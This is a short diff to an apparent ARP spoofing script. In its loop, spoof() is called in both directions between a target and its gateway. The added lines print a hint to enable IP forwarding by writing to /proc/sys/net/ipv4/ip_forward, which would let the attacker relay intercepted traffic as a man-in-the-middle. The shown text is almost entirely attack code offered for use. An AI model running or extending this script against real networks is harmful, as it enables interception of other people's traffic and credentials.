@@ -32,6 +32,8 @@ try:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
         packets_sent_count = packets_sent_count + 2
+        #TODO: forward the packets automatically
+        print("to forward the packets do: echo 1 > /proc/sys/net/ipv4/ip_forward")
         print("\r(0) Sent " + str(packets_sent_count)),
         sys.stdout.flush()
         time.sleep(2)
